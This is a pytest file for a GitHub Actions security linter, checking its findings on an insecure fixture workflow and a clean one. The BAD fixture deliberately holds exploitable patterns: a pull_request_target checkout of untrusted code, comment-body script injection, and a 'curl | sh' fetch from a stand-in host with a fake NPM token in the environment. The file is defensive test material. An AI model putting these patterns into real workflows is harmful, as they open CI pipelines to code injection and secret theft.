from conftest import assemble, load_script, run_json, run_main

mod = load_script("devops", "github-actions-author", "gha_lint.py")

# assembled at run time so the full token never sits in the repository (see conftest.assemble)
FAKE_NPM_TOKEN = assemble("npm_", "abcdefghijklmnopqrstuvwxyz0123456789")

# not an f-string: the workflow needs its ${{ ... }} expressions intact
BAD = """name: bad
on:
  pull_request_target:
  issue_comment:
    types: [created]
jobs:
  build:
    runs-on: self-hosted
    continue-on-error: true
    steps:
      - uses: actions/checkout@main
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - uses: some/action
      - uses: other/action@v2
      - name: greet
        run: echo "${{ github.event.comment.body }}"
      - run: curl -s https://x.example/install.sh | sh
        env:
          NPM_TOKEN: FAKE_NPM_TOKEN
""".replace("FAKE_NPM_TOKEN", FAKE_NPM_TOKEN)

GOOD = """name: ci
on:
  push:
    branches: [main]
  pull_request:
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
        with:
          persist-credentials: false
      - name: Title via env
        env:
          TITLE: ${{ github.event.pull_request.title }}
        run: echo "$TITLE"
      - run: python3 -m pytest -q
"""


def test_bad_workflow(write, tmp_path):
    f = write("bad.yml", BAD)
    rc, rep = run_json(mod, [str(f), "--json"])
    assert rc == 1
    ids = {x["id"] for x in rep["findings"]}
    for expected in ["GHA-001", "GHA-003", "GHA-004", "GHA-005", "GHA-006", "GHA-007", "GHA-008", "GHA-009", "GHA-011"]:
        assert expected in ids, expected
    sev = {(x["id"], x["evidence"][:20]) for x in rep["findings"]}
    assert ("GHA-003", "ref: ${{ github.even") in sev
    pins = [x for x in rep["findings"] if x["id"] == "GHA-005"]
    assert {x["severity"] for x in pins} == {"high", "medium"}
    assert rep["counts"]["critical"] == 1


def test_good_workflow_is_clean(write, tmp_path):
    f = write("ci.yml", GOOD)
    rc, rep = run_json(mod, [str(f), "--json", "--fail-on", "info"])
    assert rc == 0, rep["findings"]
    assert rep["findings"] == []


def test_structural_errors_and_write_all(write, tmp_path):
    f = write("w.yml", "name: x\npermissions: write-all\njobs:\n  a:\n    steps:\n      - uses: a/b@v1\n        run: echo\n")
    rc, rep = run_json(mod, [str(f), "--json"])
    ids = [x["id"] for x in rep["findings"]]
    assert ids.count("GHA-000") >= 3  # missing on, no runs-on, uses+run
    assert "GHA-002" in ids


def test_directory_input_parse_error_and_missing(write, tmp_path):
    write("wf/a.yml", GOOD)
    write("wf/b.yml", "jobs:\n\t- bad\n")
    rc, rep = run_json(mod, [str(tmp_path / "wf"), "--json"])
    assert rc == 2 and len(rep["parse_errors"]) == 1 and len(rep["files"]) == 2
    rc, _, err = run_main(mod, [str(tmp_path / "nope.yml")])
    assert rc == 2
    (tmp_path / "empty").mkdir()
    rc, _, err = run_main(mod, [str(tmp_path / "empty")])
    assert rc == 2 and "no workflow" in err


def test_text_output_mentions_fix(write, tmp_path):
    f = write("bad.yml", BAD)
    rc, out, _ = run_main(mod, [str(f)])
    assert rc == 1 and "fix:" in out and "GHA-003" in out
